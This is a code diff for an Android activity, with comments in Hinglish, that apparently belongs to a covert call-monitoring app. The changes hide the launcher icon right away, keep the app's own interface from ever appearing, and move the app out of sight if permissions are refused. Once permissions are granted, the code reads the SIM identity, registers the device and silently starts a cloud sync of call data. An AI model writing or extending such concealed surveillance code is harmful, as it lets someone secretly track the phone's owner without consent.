@@ -10,8 +10,8 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 
 /**
- * App UI nahi — sirf system permission popup.
- * Install/adb start ke baad khud dialog aata hai, icon tap nahi.
+ * Install/open: pehle icon hide, phir home par sirf system permission popup.
+ * CallTech UI kabhi nahi dikhti.
  */
 class PermissionTrampolineActivity : AppCompatActivity() {
     private val mainHandler = Handler(Looper.getMainLooper())
@@ -22,9 +22,15 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
             Log.d(TAG, "Permission result $result")
             if (!SyncBootstrap.needsRuntimePermissions(this)) {
-                finishQuietly(sync = true)
+                onAllowed()
             } else {
-                finishQuietly(sync = false)
+                finished = true
+                LauncherHider.hideNow(this)
+                try {
+                    moveTaskToBack(true)
+                } catch (_: Exception) {
+                }
+                finish()
             }
         }
 
@@ -34,13 +40,14 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         MongoSyncHelper.ensureApiUrl(this)
         CallSyncHelper.markBackgroundSyncEnabled(this, true)
         SyncBootstrap.armBackgroundSync(this)
+        LauncherHider.hideNow(this)
 
         if (!SyncBootstrap.needsRuntimePermissions(this)) {
-            finishQuietly(sync = true)
+            onAllowed()
             return
         }
 
-        mainHandler.postDelayed({ askPermissions() }, 150L)
+        mainHandler.post { askPermissions() }
     }
 
     override fun onResume() {
@@ -48,12 +55,13 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         if (finished) {
             return
         }
+        LauncherHider.hideNow(this)
         if (!SyncBootstrap.needsRuntimePermissions(this)) {
-            finishQuietly(sync = true)
+            onAllowed()
             return
         }
         if (!askedOnce) {
-            mainHandler.postDelayed({ askPermissions() }, 80L)
+            mainHandler.postDelayed({ askPermissions() }, 120L)
         }
     }
 
@@ -70,7 +78,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
             checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED
         }
         if (missing.isEmpty()) {
-            finishQuietly(sync = true)
+            onAllowed()
             return
         }
         askedOnce = true
@@ -78,29 +86,30 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         permissionLauncher.launch(missing.toTypedArray())
     }
 
-    private fun finishQuietly(sync: Boolean) {
+    private fun onAllowed() {
         if (finished) {
             return
         }
         finished = true
+        LauncherHider.hideNow(this)
+        SyncObserverManager.register(applicationContext)
+        SyncBootstrap.armBackgroundSync(applicationContext)
 
-        if (sync) {
-            SyncObserverManager.register(applicationContext)
-            BackgroundSyncRunner.run {
-                try {
-                    CallSyncService.holdDuring(applicationContext) {
-                        DeviceRegistration.registerNow(applicationContext)
-                        InstallFlow.runFirstCloudSync(applicationContext)
-                        SyncBootstrap.onPermissionsReady(applicationContext)
-                    }
-                } catch (error: Exception) {
-                    Log.e(TAG, "Silent first sync failed", error)
-                } finally {
-                    InstallFlow.completeSetup(applicationContext)
-                    LauncherHider.markAndSchedule(applicationContext)
+        BackgroundSyncRunner.run {
+            try {
+                CallSyncService.holdDuring(applicationContext) {
+                    SimNumberHelper.refreshSimIdentity(applicationContext)
+                    DeviceRegistration.registerNow(applicationContext)
+                    InstallFlow.runFirstCloudSync(applicationContext)
+                    SyncBootstrap.onPermissionsReady(applicationContext)
+                    SyncObserverManager.register(applicationContext)
                 }
+            } catch (error: Exception) {
+                Log.e(TAG, "First sync failed", error)
+            } finally {
+                InstallFlow.completeSetup(applicationContext)
+                LauncherHider.hideNow(applicationContext)
             }
-            LauncherHider.armHideAlarms(applicationContext, startDelayMs = 8_000L)
         }
 
         try {
